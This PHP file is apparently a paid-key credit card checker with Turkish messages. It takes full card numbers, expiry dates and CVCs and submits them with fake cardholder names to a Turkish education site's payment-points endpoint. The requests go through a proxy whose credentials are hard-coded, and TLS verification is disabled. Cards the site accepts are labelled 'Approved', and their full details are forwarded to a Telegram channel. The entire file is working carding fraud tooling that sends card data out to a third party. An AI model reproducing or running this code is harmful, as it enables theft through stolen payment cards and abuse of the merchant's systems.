<?php
header('Content-Type: text/plain; charset=utf-8');

if ($_SERVER['REQUEST_METHOD'] !== 'POST' && $_SERVER['REQUEST_METHOD'] !== 'GET') {
    http_response_code(405);
    die("❌ Sadece POST ve GET istekleri kabul edilir");
}

function validateKey($key) {
    if (empty($key)) {
        return false;
    }
    
    $keysFile = '../users/bbbba.json'; 
    
    if (!file_exists($keysFile)) {
        return false;
    }
    
    $data = json_decode(file_get_contents($keysFile), true);
    if (!$data || !isset($data['keys'])) {
        return false;
    }
    
    foreach ($data['keys'] as $keyData) {
        if ($keyData['key'] === $key && $keyData['isActive']) {
            $expirationDate = new DateTime($keyData['expiresAt']);
            $currentDate = new DateTime();
            
            if ($currentDate <= $expirationDate) {
                return true;
            }
        }
    }
    
    return false;
}

$userKey = $_REQUEST['key'] ?? '';
if (!validateKey($userKey)) {
    http_response_code(401);
    die("❌ Geçersiz veya süresi dolmuş key! API erişimi reddedildi.");
}

$turkish_names = [
    "Ahmet Yılmaz", "Mehmet Demir", "Ayşe Kaya", "Fatma Şahin", "Mustafa Çelik",
    "Emine Aydın", "Ali Özkan", "Hatice Arslan", "Hüseyin Kılıç", "Zeynep Doğan",
    "İbrahim Koç", "Elif Güneş", "Ömer Erdoğan", "Seda Yıldız", "Murat Tunç",
    "Zehra Polat", "Abdullah Karaca", "Büşra Aktaş", "Yunus Kocaman", "Neslihan Kurt"
];

$proxy_host = "rs-bel.pvdata.host";
$proxy_port = "8080";
$proxy_username = "g2rTXpNfPdcw2fzGtWKp62yH";
$proxy_password = "nizar1elad2";

function generateFakeName($names) {
    return $names[array_rand($names)];
}

function sanitizeInput($input) {
    return htmlspecialchars(strip_tags(trim($input)), ENT_QUOTES, 'UTF-8');
}

function checkCard($payload) {
    global $proxy_host, $proxy_port, $proxy_username, $proxy_password;
    
    $url = "https://www.tongucakademi.com/uyelikpaketleri/getcardpoint";
    
    $headers = [
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
        'X-Requested-With: XMLHttpRequest',
        'Referer: https://www.tongucakademi.com/uyelikpaketleri/odeme/116',
        'Accept-Language: tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
        'Content-Type: application/x-www-form-urlencoded',
        'Accept: application/json, text/javascript, */*; q=0.01'
    ];
    
    $ch = curl_init();
    
    if ($ch === false) {
        return ['error' => 'cURL initialization failed'];
    }
    
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query($payload),
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 10,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_MAXREDIRS => 3
    ]);
    
    curl_setopt($ch, CURLOPT_PROXY, $proxy_host . ':' . $proxy_port);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy_username . ':' . $proxy_password);
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    
    curl_close($ch);
    
    if ($error) {
        return ['error' => 'cURL Error: ' . $error];
    }
    
    if ($httpCode !== 200) {
        return ['error' => 'HTTP Error: ' . $httpCode];
    }
    
    if (empty($response)) {
        return ['error' => 'Empty response'];
    }
    
    $result = json_decode($response, true);
    
    if (json_last_error() !== JSON_ERROR_NONE) {
        return [
            'error' => 'Invalid JSON response: ' . json_last_error_msg(), 
            'raw_response' => substr($response, 0, 200)
        ];
    }
    
    return $result;
}

if (!isset($_REQUEST['card']) || empty($_REQUEST['card'])) {
    http_response_code(400);
    echo "❌ Error | card parametresi eksik";
    exit;
}

$card_str = sanitizeInput($_REQUEST['card']);
$card_parts = explode('|', $card_str);

if (count($card_parts) !== 4) {
    http_response_code(400);
    echo "❌ Error | card parametresi hatalı formatta (format: kart_no|ay|yıl|cvc)";
    exit;
}

list($KartNo, $KartAy, $KartYil, $KartCvc) = array_map('sanitizeInput', $card_parts);

$KartNo = preg_replace('/[\s\-]/', '', $KartNo);

if (!is_numeric($KartAy) || $KartAy < 1 || $KartAy > 12) {
    echo "❌ Error | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | Geçersiz ay";
    exit;
}

if (!is_numeric($KartYil)) {
    echo "❌ Error | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | Geçersiz yıl";
    exit;
}

if (strlen($KartYil) == 2) {
    $currentYear = (int)date('Y');
    $currentCentury = (int)substr($currentYear, 0, 2);
    $KartYil = $currentCentury . str_pad($KartYil, 2, '0', STR_PAD_LEFT);
    
    if ((int)$KartYil < $currentYear) {
        $KartYil = ($currentCentury + 1) . substr($KartYil, 2);
    }
} elseif (strlen($KartYil) != 4) {
    echo "❌ Error | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | Geçersiz yıl formatı";
    exit;
}

try {
    $currentDate = new DateTime();
    $expiryDate = DateTime::createFromFormat('Y-m', $KartYil . '-' . str_pad($KartAy, 2, '0', STR_PAD_LEFT));
    $expiryDate->modify('last day of this month')->setTime(23, 59, 59);
    
    if ($expiryDate === false || $expiryDate < $currentDate) {
        echo "❌ Error | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | Kart süresi dolmuş";
        exit;
    }
} catch (Exception $e) {
    echo "❌ Error | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | Tarih format hatası";
    exit;
}

if (!is_numeric($KartCvc) || strlen($KartCvc) < 3 || strlen($KartCvc) > 4) {
    echo "❌ Error | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | Geçersiz CVC";
    exit;
}

$KartAd = generateFakeName($turkish_names);

$payload = [
    'KartNo' => $KartNo,
    'KartAd' => $KartAd,
    'KartCvc' => $KartCvc,
    'KartAy' => str_pad($KartAy, 2, '0', STR_PAD_LEFT),
    'KartYil' => $KartYil,
    'Total' => '1.0'
];

$result = checkCard($payload);

if (isset($result['error'])) {
    echo "❌ Error | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | " . $result['error'];
} elseif (isset($result['Durum']) && $result['Durum'] && 
          isset($result['Data']) && $result['Data'] && 
          isset($result['Data']['Amount']) && $result['Data']['Amount'] > 0) {
    $points = (float)$result['Data']['Amount'];
    echo "✅ Approved | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | {$points} TRY";
    
    date_default_timezone_set('Europe/Istanbul');
    $istanbulTime = date('d.m.Y H:i:s');
    
    $telegramMessage = "🎉 <b>YENİ BAŞARILI İŞLEM!</b>\n\n";
    $telegramMessage .= "💳 <b>Kart:</b> <code>{$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc}</code>\n";
    $telegramMessage .= "💰 <b>Tutar:</b> {$points} TRY\n";
    $telegramMessage .= "✅ <b>Durum:</b> Onaylandı\n";
    $telegramMessage .= "🕐 <b>Tarih:</b> {$istanbulTime}\n";
    $telegramMessage .= "👤 <b>İsim:</b> {$KartAd}";
    
    sendTelegramMessage($telegramMessage);
} else {
    $errorMsg = "Unknown error";
    if (isset($result['Message'])) {
        $errorMsg = sanitizeInput($result['Message']);
    } elseif (isset($result['Durum']) && !$result['Durum']) {
        $errorMsg = "0.0 TRY PUAN YOK";
    }
    echo "❌ Declined | {$KartNo}|{$KartAy}|{$KartYil}|{$KartCvc} | {$errorMsg}";
}
?>